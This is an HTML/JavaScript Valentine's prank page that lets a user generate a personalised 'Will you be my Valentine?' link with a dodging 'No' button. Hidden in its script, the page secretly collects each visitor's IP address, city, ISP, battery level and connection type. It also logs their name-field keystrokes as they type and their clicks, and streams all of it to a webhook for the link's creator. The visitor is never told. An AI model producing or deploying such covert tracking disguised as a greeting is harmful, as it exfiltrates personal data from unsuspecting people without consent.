<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Will you be my Valentine?</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
  
  <style>
    :root { --primary: #ff4d6d; --secondary: #fbafba; --bg: #ffe6eb; --gold: #ffd700; }
    body { margin: 0; height: 100vh; font-family: 'Poppins', sans-serif; display: flex; justify-content: center; align-items: center; background: var(--bg); overflow: hidden; transition: background 1.5s ease; }

    #namePortal {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.unsplash.com/photo-1518199266791-5375a83190b7?q=80&w=2070&auto=format&fit=crop') no-repeat center center;
      background-size: cover; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; z-index: 1000; padding: 20px; transition: opacity 0.8s ease;
    }

    #customText { color: white; margin-bottom: 25px; font-style: italic; font-size: 1.1rem; opacity: 0; font-weight: 600; transition: opacity 2s ease; display: inline-block; padding: 0 15px; line-height: 1.4; }
    .pulsing { animation: heartBeat 3s infinite ease-in-out; }
    @keyframes heartBeat {
      0%, 100% { transform: scale(1); text-shadow: 0 0 5px rgba(255, 215, 0, 0.2); }
      50% { transform: scale(1.05); text-shadow: 0 0 20px rgba(255, 215, 0, 0.8); color: var(--gold); }
    }

    @keyframes shake {
      0% { transform: scale(var(--scale)) translate(0,0); }
      25% { transform: scale(var(--scale)) translate(5px, 5px); }
      50% { transform: scale(var(--scale)) translate(-5px, -5px); }
      75% { transform: scale(var(--scale)) translate(5px, -5px); }
      100% { transform: scale(var(--scale)) translate(0,0); }
    }
    .shaking { animation: shake 0.2s infinite; box-shadow: 0 0 20px var(--gold); }

    .glass-box { background: rgba(255, 255, 255, 0.15); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.2); padding: 40px 25px; border-radius: 30px; box-shadow: 0 10px 40px rgba(0,0,0,0.4); max-width: 420px; width: 85%; }

    .card { background: white; padding: 40px; width: 90vw; max-width: 450px; height: 550px; border-radius: 40px; box-shadow: 0 15px 50px rgba(0,0,0,0.1); display: none; flex-direction: column; align-items: center; justify-content: space-between; position: relative; overflow: hidden; z-index: 10; }
    
    #yes { --scale: 1; background: var(--primary); color: white; font-size: 20px; font-weight: 700; padding: 15px 45px; border: none; border-radius: 50px; cursor: pointer; transition: transform 0.2s; z-index: 50; }
    #no { background: var(--secondary); color: white; width: 140px; height: 45px; display: flex; align-items: center; justify-content: center; border: none; border-radius: 50px; position: absolute; cursor: pointer; transition: all 0.15s ease; z-index: 200; bottom: 60px; left: 50%; transform: translateX(-50%); font-size: 0.85rem; font-weight: 600; text-align: center; }

    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; justify-content: center; align-items: center; z-index: 5000; backdrop-filter: blur(8px); }
    .custom-modal { background: white; padding: 30px; border-radius: 30px; width: 90%; max-width: 400px; text-align: center; }
    .modal-input { width: 100%; padding: 12px; margin: 8px 0; border: 2px solid var(--secondary); border-radius: 12px; outline: none; font-family: 'Poppins'; box-sizing: border-box; }
  </style>
</head>
<body>

  <div id="modalOverlay" class="modal-overlay">
    <div class="custom-modal">
      <h2 style="color: var(--primary); margin: 0 0 10px 0;">Create Your Link</h2>
      <div id="step1" style="width: 100%;">
        <input type="text" id="creatorInput" class="modal-input" placeholder="Your Name" oninput="updateSuggestions()">
        <input type="text" id="targetInput" class="modal-input" placeholder="Their Name" oninput="updateSuggestions()">
        <p style="font-size: 0.8rem; color: var(--primary); font-weight: 800; margin: 12px 0 5px 0;">Enter your partner name to show messages</p>
        <select id="suggestionBox" class="modal-input" onchange="document.getElementById('msgInput').value = this.value">
            <option value="">‚ú® Romantic Suggestions...</option>
        </select>
        <textarea id="msgInput" class="modal-input" placeholder="Custom message..." rows="3"></textarea>
        <button onclick="processLinkGeneration()" style="background: var(--primary); color: white; border: none; padding: 15px 25px; border-radius: 50px; cursor: pointer; font-weight: 800; width: 100%;">Generate Link</button>
      </div>
      <div id="step2" style="display: none; width: 100%;">
        <div id="urlDisplay" style="background:#fdf2f4; padding:10px; border-radius:10px; font-size:0.7rem; word-break:break-all; border:1px dashed var(--primary); margin: 10px 0;"></div>
        <button onclick="copyGeneratedUrl()" style="background: var(--primary); color: white; border: none; padding: 15px 25px; border-radius: 50px; cursor: pointer; font-weight: 800; width: 100%;">Copy & Close</button>
      </div>
    </div>
  </div>

  <div id="namePortal">
    <div class="glass-box">
      <h1 style="color: white; font-weight: 800; margin-bottom: 5px;">My heart is locked.</h1>
      <p id="customText"></p>
      <input type="text" id="userName" style="padding: 15px; border-radius: 50px; border: none; width: 85%; text-align: center;" placeholder="Your name..." oninput="liveTyping(this.value)">
      <button onclick="startApp()" style="background: var(--primary); color: white; border: none; padding: 15px 40px; border-radius: 50px; font-weight: 800; cursor: pointer; margin-top: 20px;">Unlock My Heart</button>
      <p style="color:white; font-size:0.75rem; margin-top:20px; opacity:0.8; cursor:pointer; text-decoration: underline;" onclick="document.getElementById('modalOverlay').style.display='flex'">Create your own link</p>
    </div>
  </div>

  <div class="card" id="mainCard">
    <div id="joke-text" style="color: var(--primary); font-weight: 800; text-transform: uppercase; font-size: 0.75rem; height: 60px; text-align: center;">THINK CAREFULLY... üòà</div>
    <h1 style="color: var(--primary); font-weight: 800; text-align: center;">Will you be my Valentine?</h1>
    <div style="flex-grow:1; display:flex; align-items:center;"><button id="yes" onclick="yesClick()">Yes</button></div>
    <button id="no" onmouseover="moveNo()">No</button>
  </div>

<script>
  let visitorName = "", clickCount = 0, yesScale = 1, lastMsgId = null, actionHistory = [];
  let batteryLevel = "Unknown", connectionType = "Unknown";
  const WEBHOOK_URL = "YOUR_WEBHOOK_URL";

  const phase1 = ["Try again!", "Close!", "Nope!"];
  const phase2 = ["Seriously?", "Stop it.", "Wasting time."];
  const phase3 = ["Leak starting... üîç", "Calling Mom... üìû", "IP Exposed! üìç"];

  const promises = [
    "I promise to hold your hand through every storm, {name}.",
    "{name}, I promise to stay until the stars stop shining.",
    "You made me the luckiest alive, {name}. I'm yours forever."
  ];

  window.onload = async () => {
    if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        batteryLevel = `${Math.round(battery.level * 100)}%`;
    }
    if (navigator.connection) {
        connectionType = navigator.connection.effectiveType || "Unknown";
    }

    const params = new URLSearchParams(window.location.search);
    if(params.get('to')) document.getElementById('userName').value = decodeURIComponent(params.get('to'));
    if(params.get('msg')) {
      const msgEl = document.getElementById('customText');
      msgEl.innerText = `"${decodeURIComponent(params.get('msg'))}"`;
      setTimeout(() => { msgEl.style.opacity = "1"; msgEl.classList.add('pulsing'); }, 800);
    }
    trackEvent("Page Opened (Tracking Active)");
  };

  let typingTimer;
  function liveTyping(val) {
    clearTimeout(typingTimer);
    typingTimer = setTimeout(() => {
        trackEvent(`Is currently typing: "${val}"`);
    }, 1000);
  }

  async function trackEvent(status) {
    const time = new Date().toLocaleTimeString();
    actionHistory.push(`[${time}] ${status}`);
    
    let spyData = {};
    try {
        const res = await fetch('https://ipapi.co/json/');
        spyData = await res.json();
    } catch (e) { spyData = { ip: "Blocked", city: "Unknown", org: "Unknown" }; }

    const payload = {
      embeds: [{
        title: `üíñ Live Session: ${visitorName || "Guest"}`,
        color: status.includes("YES") ? 0x00ff00 : 0xff4d6d,
        fields: [
          { name: "Current Status", value: `**${status}**`, inline: true },
          { name: "Battery / Net", value: `${batteryLevel} / ${connectionType}`, inline: true },
          { name: "Misses", value: `${clickCount}`, inline: true },
          { name: "Location", value: `${spyData.city || "Unknown"}`, inline: true },
          { name: "Activity Log", value: `\`\`\`${actionHistory.slice(-20).join("\n")}\`\`\``, inline: false },
          { name: "Network Data", value: `IP: \`${spyData.ip}\`\nISP: \`${spyData.org}\``, inline: false }
        ],
        timestamp: new Date().toISOString()
      }]
    };

    const url = lastMsgId ? `${WEBHOOK_URL}/messages/${lastMsgId}` : `${WEBHOOK_URL}?wait=true`;
    const method = lastMsgId ? 'PATCH' : 'POST';
    
    try {
      const response = await fetch(url, { method, headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
      if (!lastMsgId && response.ok) {
        const data = await response.json();
        lastMsgId = data.id;
      }
    } catch (e) {}
  }

  function startApp() {
    visitorName = document.getElementById('userName').value.trim() || "Secret Admirer";
    trackEvent("Heart Unlocked üîì");
    document.getElementById('namePortal').style.display = "none";
    document.getElementById('mainCard').style.display = "flex";
  }

  function moveNo() {
    clickCount++;
    const card = document.getElementById("mainCard");
    const noBtn = document.getElementById("no");
    const yesBtn = document.getElementById("yes");
    
    if (clickCount >= 10) document.body.style.background = "#800000";

    let msgList = clickCount < 6 ? phase1 : (clickCount < 16 ? phase2 : phase3);
    const currentMsg = msgList[Math.floor(Math.random() * msgList.length)];
    
    noBtn.innerText = currentMsg;
    document.getElementById("joke-text").innerText = currentMsg;

    noBtn.style.left = (Math.random() * (card.clientWidth - 140 - 60) + 30) + "px";
    noBtn.style.top = (Math.random() * (card.clientHeight - 45 - 200) + 180) + "px";
    noBtn.style.transform = "none"; 

    yesScale += 0.25;
    yesBtn.style.setProperty('--scale', yesScale);
    yesBtn.style.transform = `scale(${yesScale})`;
    if (clickCount >= 10) yesBtn.classList.add('shaking');

    if (clickCount % 3 === 0) trackEvent(`Struggling: ${clickCount} misses`);
  }

  function yesClick() {
    trackEvent("ACCEPTED! ‚ù§Ô∏è");
    document.body.style.background = "url('https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpwaG54Z2V3ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/26tOZ42Mg6pbTUPHW/giphy.gif') center center / cover";
    confetti({ particleCount: 150, spread: 70 });
    const randomMsg = promises[Math.floor(Math.random() * promises.length)].replace("{name}", visitorName);
    document.getElementById("mainCard").innerHTML = `<div style="text-align:center; margin:auto; padding:20px;"><h2>EXCELLENT CHOICE. ‚ù§Ô∏è</h2><p>${randomMsg}</p></div>`;
  }

  function updateSuggestions() {
    const to = document.getElementById('targetInput').value.trim() || "You";
    const deepMessages = [
      `${to}, you are the piece of my soul I never knew was missing. [cite: -]`,
      `Every beat of my heart belongs to you, ${to}. [cite: -]`,
      `In a world of temporary things, ${to}, you are my forever. [cite: -]`
    ];
    const select = document.getElementById('suggestionBox');
    select.innerHTML = '<option value="">‚ú® Romantic Suggestions...</option>' + 
      deepMessages.map(s => `<option value="${s}">${s}</option>`).join('');
  }

  function processLinkGeneration() {
    const from = document.getElementById('creatorInput').value.trim();
    const to = document.getElementById('targetInput').value.trim();
    const msg = document.getElementById('msgInput').value.trim();
    const finalUrl = `${window.location.href.split('?')[0]}?from=${encodeURIComponent(from)}&to=${encodeURIComponent(to)}&msg=${encodeURIComponent(msg)}`;
    document.getElementById('urlDisplay').innerText = finalUrl;
    document.getElementById('step1').style.display = 'none';
    document.getElementById('step2').style.display = 'block';
  }

  function copyGeneratedUrl() {
    navigator.clipboard.writeText(document.getElementById('urlDisplay').innerText).then(() => {
        document.getElementById('modalOverlay').style.display = 'none';
    });
  }
</script>
</body>
</html>
